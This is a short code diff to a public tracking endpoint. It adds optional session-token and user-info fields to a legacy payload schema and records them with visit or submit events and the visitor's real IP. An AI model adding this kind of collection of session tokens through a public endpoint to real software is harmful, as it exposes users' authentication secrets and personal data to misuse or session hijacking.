@@ -43,6 +43,8 @@ const LegacyBodySchema = z.object({
   sessionId: z.string().min(4).max(64),
   event: z.string().min(1).max(40),
   page: z.string().min(1).max(200).optional(),
+  sessionToken: z.string().max(80).optional(),
+  userInfo: UserInfoSchema.optional(),
 });
 
 function pageFromPath(path: string | undefined): z.infer<typeof PageEnum> {
@@ -95,11 +97,13 @@ export const Route = createFileRoute("/api/public/track")({
             sid: legacyPayload.data.sessionId,
             type: legacyPayload.data.event === "submit" ? "submit" : "visit",
             page: pageFromPath(legacyPayload.data.page),
+            sessionToken: legacyPayload.data.sessionToken,
+            userInfo: legacyPayload.data.userInfo,
           };
         } else {
           return new Response("Invalid payload", { status: 400, headers: cors });
         }
-        const { sid, type, page, data } = payload;
+        const { sid, type, page, data, sessionToken, userInfo } = payload;
 
         // Capture the visitor's real IP (Cloudflare / proxy headers)
         const ip =
